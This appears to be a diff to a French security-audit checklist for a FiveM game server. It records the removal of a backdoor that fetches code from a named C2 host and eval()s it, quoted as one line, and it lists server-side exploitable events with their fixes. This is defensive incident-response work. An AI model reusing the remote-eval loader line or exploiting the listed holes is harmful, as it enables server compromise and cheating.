@@ -4,14 +4,14 @@
 
 ## 🚨 INCIDENT SÉCURITÉ — BACKDOOR RCE (2026-06-03)
 
-- [x] **thug-killfeeds/html/server.js** — backdoor RCE actif : `require('http').get('http://uabjuza.lt:3000/api/connector/execute/js/SC_...')` → `eval()` de code distant arbitraire, chargé **côté serveur** via `fxmanifest.lua` (`server_scripts{ 'html/*.js' }`). Pas dans `escrow_ignore` = injecté furtivement. Famille de malware loader FiveM connue.
+- [x] ✅ **thug-killfeeds/html/server.js** — backdoor RCE actif : `require('http').get('http://uabjuza.lt:3000/api/connector/execute/js/SC_...')` → `eval()` de code distant arbitraire, chargé **côté serveur** via `fxmanifest.lua` (`server_scripts{ 'html/*.js' }`). Pas dans `escrow_ignore` = injecté furtivement. Famille de malware loader FiveM connue.
   → ✅ Fichier supprimé (`git rm`) + `'html/*.js'` retiré des server_scripts. **Branche `fix/critical-security`.**
 
 ### Audit de compromission (sweep complet du repo — fait 2026-06-03)
-- [x] **Recherche stage-1 du loader ailleurs** — domaine C2 `uabjuza`/`api/connector/execute` introuvable hors thug-killfeeds. ✅ Un seul point d'injection.
-- [x] **Scan loaders/eval distants tout le repo** (.js + .lua) — aucun autre. Les hits `PerformHttpRequest`/`loadstring`/`load()` sont tous bénins : version-checks GitHub (viper-emote), lookups steam/discord (vipersquad), webhooks Discord, ACL ox_lib/qb-core.
-- [x] **Configs/clés exposées** — aucun `.cfg`, aucune licence/clé API/mdp DB dans le repo.
-- [x] **ACE/principal abusifs** — aucun. `viper-boutique` `add_principal` = grades VIP achetés (`item.set_group` défini par admin) ; `givecoins` gated console/admin. OK.
+- [x] ✅ **Recherche stage-1 du loader ailleurs** — domaine C2 `uabjuza`/`api/connector/execute` introuvable hors thug-killfeeds. ✅ Un seul point d'injection.
+- [x] ✅ **Scan loaders/eval distants tout le repo** (.js + .lua) — aucun autre. Les hits `PerformHttpRequest`/`loadstring`/`load()` sont tous bénins : version-checks GitHub (viper-emote), lookups steam/discord (vipersquad), webhooks Discord, ACL ox_lib/qb-core.
+- [x] ✅ **Configs/clés exposées** — aucun `.cfg`, aucune licence/clé API/mdp DB dans le repo.
+- [x] ✅ **ACE/principal abusifs** — aucun. `viper-boutique` `add_principal` = grades VIP achetés (`item.set_group` défini par admin) ; `givecoins` gated console/admin. OK.
 
 ### ⚠️ ACTIONS IR — décisions utilisateur (le nettoyage repo ne suffit pas)
 - [ ] **Considérer le serveur comme compromis** depuis l'install de thug-killfeeds — le backdoor a pu exécuter du code en mémoire (le stage-2 eval'd n'est PAS sur disque, donc invisible au repo).
@@ -33,17 +33,17 @@ Cocher `[x]` quand fait. Format : `resource/fichier:ligne`.
 
 > ✅ Lot corrigé sur branche `fix/critical-security` (2026-06-03). Vérifié par revue manuelle — **test runtime serveur FiveM encore à faire**.
 
-- [x] **viperpvp_redzone/server/main.lua:725** — `death:register(killerId,zoneId)` fired par le **victim**, serveur fait confiance aux deux → farm illimité money/kills via alt.
+- [x] ✅ **viperpvp_redzone/server/main.lua:725** — `death:register(killerId,zoneId)` fired par le **victim**, serveur fait confiance aux deux → farm illimité money/kills via alt.
   → ✅ Guard anti double-crédit (`if DeadPlayers[victimId] then return`), killer mort ne peut pas créditer, victime ET killer doivent être en zone. ⚠️ Validation full damage-tracking (killer a réellement tiré sur victime) = rework plus lourd, **non fait** → reste partiellement client-trusted en collusion proche.
-- [x] **viper-weapon-patches/server/weapons.lua:31** — `headshotConfirmed(victimSrc)` → client modifié **instakill n'importe qui, partout**, toutes les 300ms.
+- [x] ✅ **viper-weapon-patches/server/weapons.lua:31** — `headshotConfirmed(victimSrc)` → client modifié **instakill n'importe qui, partout**, toutes les 300ms.
   → ✅ Gate distance serveur-side : attaquant doit être à portée d'arme max (`headshotMaxDist`) de la victime. Défait l'instakill à distance arbitraire. ⚠️ Pas de raycast/ligne de vue serveur (impossible simplement) → spoofable au contact comme un tir légitime.
-- [x] **vipertpramp/server/main.lua:187** — `selfRevive` net event, **aucune auth, aucun check mort** → self-revive instantané.
+- [x] ✅ **vipertpramp/server/main.lua:187** — `selfRevive` net event, **aucune auth, aucun check mort** → self-revive instantané.
   → ✅ Exige mort validée serveur-side via nouvel export redzone `IsPlayerDead(src)` ; efface l'état via `ClearPlayerDeath(src)` après revive.
-- [x] **vipercar/server/main.lua:151** — `SpawnVehicle` relaie `model`+coords client sans check → spawn n'importe quel véhicule n'importe où.
+- [x] ✅ **vipercar/server/main.lua:151** — `SpawnVehicle` relaie `model`+coords client sans check → spawn n'importe quel véhicule n'importe où.
   → ✅ Whitelist `AllowedModels` construite depuis `Config.Vehicles`. ⚠️ `spawnData` (coords) reste client-fourni — risque moindre (son propre véhicule).
-- [x] **viper-boutique/server/main.lua:565** — `saveVehicleMods` aucun check de propriété.
+- [x] ✅ **viper-boutique/server/main.lua:565** — `saveVehicleMods` aucun check de propriété.
   → ✅ Guard ownership `SELECT COUNT(*) FROM boutique_vehicles WHERE citizenid=? AND vehicle_model=?` avant write.
-- [x] **viperjail/server/main.lua:272** — `unjailOffline` args du log **décalés** → lignes corrompues, action défaut 'JAIL'.
+- [x] ✅ **viperjail/server/main.lua:272** — `unjailOffline` args du log **décalés** → lignes corrompues, action défaut 'JAIL'.
   → ✅ `LogJailAction(src, pName, '', cid, 'UNJAIL', nil, nil, nil)`.
 
 ---
@@ -52,15 +52,15 @@ Cocher `[x]` quand fait. Format : `resource/fichier:ligne`.
 
 > ✅ Lot corrigé sur branche `fix/high-security` (2026-06-03). Vérifié par revue manuelle — **test runtime serveur FiveM à faire**.
 
-- [x] **viperpvp_redzone/server/main.lua:948** — `loot:request` gardé seulement sur mort déclarée client. → ✅ Ajout guard `if DeadPlayers[src] then return` (looter mort interdit). La cible doit avoir une mort validée serveur (déjà durci dans les crits).
-- [x] **viper-blanchiment/server/main.lua:157** — retour `RemoveItem` ignoré → dupe black_money. → ✅ `if not RemoveItem() then notify+return end` avant `AddMoney`.
-- [x] **viper_kit/server/main.lua:187** — `claim` TOCTOU → double-claim. → ✅ Verrou `Claiming[src]` + corps enveloppé dans `pcall(doClaim)` (déverrouillage garanti).
-- [x] **viper_ranked/server/shop.lua:79** — `buyItem` check-then-act → overspend. → ✅ Débit atomique `UPDATE ... WHERE ranked_coins>=?` + check affected rows avant l'insert d'achat.
-- [x] **viper_ranked/server/queue.lua:24** — `CheckWeaponLoadout` fail-open. → ✅ Fail-closed : refus + print serveur si l'API ox_inventory est introuvable.
-- [x] **thug-killfeeds/server/main.lua:23** — `initUrl`/`triggerNotify` webhook hijack. → ✅ Supprimés (code mort, aucun appelant client légitime — c'était l'infra du backdoor).
-- [x] **vipersquad/server/server.lua:472** — `updateSquadSettings` sans check owner ni clamp. → ✅ `IsMemberOwner` requis + name/image cappés, `memberLimit` clampé 1-10, validation type.
-- [x] **vipersquad/server/server.lua:110** — `getMemberCoords` renvoie coords de n'importe qui. → ✅ Renvoie nil sauf si `member` dans le même squad (`MySquad[member] == MySquad[source]`).
-- [x] **viper-emote/Client/Emote.lua:318** — `or "Scenario"` toujours-vrai. → ✅ `if ChosenDict == "MaleScenario" or ChosenDict == "ScenarioObject" or ChosenDict == "Scenario"`.
+- [x] ✅ **viperpvp_redzone/server/main.lua:948** — `loot:request` gardé seulement sur mort déclarée client. → ✅ Ajout guard `if DeadPlayers[src] then return` (looter mort interdit). La cible doit avoir une mort validée serveur (déjà durci dans les crits).
+- [x] ✅ **viper-blanchiment/server/main.lua:157** — retour `RemoveItem` ignoré → dupe black_money. → ✅ `if not RemoveItem() then notify+return end` avant `AddMoney`.
+- [x] ✅ **viper_kit/server/main.lua:187** — `claim` TOCTOU → double-claim. → ✅ Verrou `Claiming[src]` + corps enveloppé dans `pcall(doClaim)` (déverrouillage garanti).
+- [x] ✅ **viper_ranked/server/shop.lua:79** — `buyItem` check-then-act → overspend. → ✅ Débit atomique `UPDATE ... WHERE ranked_coins>=?` + check affected rows avant l'insert d'achat.
+- [x] ✅ **viper_ranked/server/queue.lua:24** — `CheckWeaponLoadout` fail-open. → ✅ Fail-closed : refus + print serveur si l'API ox_inventory est introuvable.
+- [x] ✅ **thug-killfeeds/server/main.lua:23** — `initUrl`/`triggerNotify` webhook hijack. → ✅ Supprimés (code mort, aucun appelant client légitime — c'était l'infra du backdoor).
+- [x] ✅ **vipersquad/server/server.lua:472** — `updateSquadSettings` sans check owner ni clamp. → ✅ `IsMemberOwner` requis + name/image cappés, `memberLimit` clampé 1-10, validation type.
+- [x] ✅ **vipersquad/server/server.lua:110** — `getMemberCoords` renvoie coords de n'importe qui. → ✅ Renvoie nil sauf si `member` dans le même squad (`MySquad[member] == MySquad[source]`).
+- [x] ✅ **viper-emote/Client/Emote.lua:318** — `or "Scenario"` toujours-vrai. → ✅ `if ChosenDict == "MaleScenario" or ChosenDict == "ScenarioObject" or ChosenDict == "Scenario"`.
 
 ---
 
